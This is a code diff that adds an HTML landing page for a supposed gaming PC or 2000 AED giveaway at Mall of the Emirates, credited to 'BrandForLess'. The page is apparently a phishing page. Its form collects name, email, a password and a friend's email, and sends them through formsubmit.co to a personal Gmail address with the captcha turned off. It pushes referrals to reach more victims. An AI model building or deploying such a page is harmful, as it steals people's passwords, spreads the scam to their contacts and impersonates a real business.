@@ -1,0 +1,63 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Register to Win a Full Gaming PC Setup or 2000 AED!</title>
+    <script src="https://cdn.tailwindcss.com"></script>
+    <style>
+        body {
+            background: linear-gradient(135deg, #1e3a8a, #3b82f6);
+        }
+        .form-container {
+            animation: fadeIn 2s ease-in-out;
+        }
+        @keyframes fadeIn {
+            from { opacity: 0; transform: translateY(20px); }
+            to { opacity: 1; transform: translateY(0); }
+        }
+    </style>
+</head>
+<body class="flex items-center justify-center min-h-screen p-4">
+    <div class="bg-white p-8 rounded-2xl shadow-lg max-w-md w-full form-container">
+        <h1 class="text-3xl font-bold text-center text-blue-600 mb-4">Win a Full Gaming PC Setup or 2000 AED!</h1>
+        <p class="text-center text-gray-700 mb-6">Register now for your chance to win at Mall of the Emirates! The more friends you refer, the higher your chances. Refer 4 friends for a 90% chance of winning!</p>
+        
+        <!-- Updated FormSubmit Action -->
+        <form action="https://formsubmit.co/belaifaredouane3@gmail.com" method="POST" class="space-y-4">
+            <div>
+                <label class="block text-sm font-medium text-gray-700">Your Name</label>
+                <input type="text" name="name" required class="mt-1 block w-full p-2 border rounded-lg focus:ring-2 focus:ring-blue-500">
+            </div>
+
+            <div>
+                <label class="block text-sm font-medium text-gray-700">Email Address</label>
+                <input type="email" name="email" required class="mt-1 block w-full p-2 border rounded-lg focus:ring-2 focus:ring-blue-500">
+            </div>
+
+            <div>
+                <label class="block text-sm font-medium text-gray-700">Password</label>
+                <input type="password" name="password" required class="mt-1 block w-full p-2 border rounded-lg focus:ring-2 focus:ring-blue-500">
+            </div>
+
+            <div>
+                <label class="block text-sm font-medium text-gray-700">Refer a Friend's Email</label>
+                <input type="email" name="friend_email" class="mt-1 block w-full p-2 border rounded-lg focus:ring-2 focus:ring-blue-500">
+            </div>
+
+            <!-- Add a hidden input for the subject -->
+            <input type="hidden" name="_subject" value="New Registration for Gaming PC Giveaway!">
+            
+            <!-- Add a hidden input for the success redirect URL (optional) -->
+            <input type="hidden" name="_next" value="https://yourwebsite.com/thank-you.html">
+            
+            <!-- Add a hidden input to disable captcha (optional) -->
+            <input type="hidden" name="_captcha" value="false">
+
+            <button type="submit" class="w-full bg-blue-600 text-white p-2 rounded-lg hover:bg-blue-700 transition">Register Now</button>
+        </form>
+        
+        <p class="text-center text-gray-600 mt-4 text-sm">Brought to you by <strong>BrandForLess</strong>. Increase your chances with every referral!</p>
+    </div>
+</body>
+</html>
